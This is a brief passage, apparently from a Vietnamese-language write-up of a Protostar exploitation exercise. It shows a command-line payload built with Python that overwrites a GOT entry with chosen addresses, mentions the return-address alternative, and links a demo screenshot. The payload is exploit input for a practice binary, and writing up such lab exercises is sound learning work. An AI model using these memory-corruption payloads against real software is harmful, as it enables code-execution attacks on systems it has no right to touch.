`$(python -c "print 'AAAABBBBCCCCDDDDEEEE'+'\x74\x97\x04\x08'") $(python -c "print '\x94\x84\x04\x08'")` => overwrite GOT \n
Cũng có thể overwrite return address của main nữa, nhưng khi đó phải brute stack address :v khá là lười. Demo:\n
![image](https://github.com/CP04042K/Protostar-writeup/assets/35491855/5f80f9d9-42eb-45ac-997f-fe78c0bc5d80)
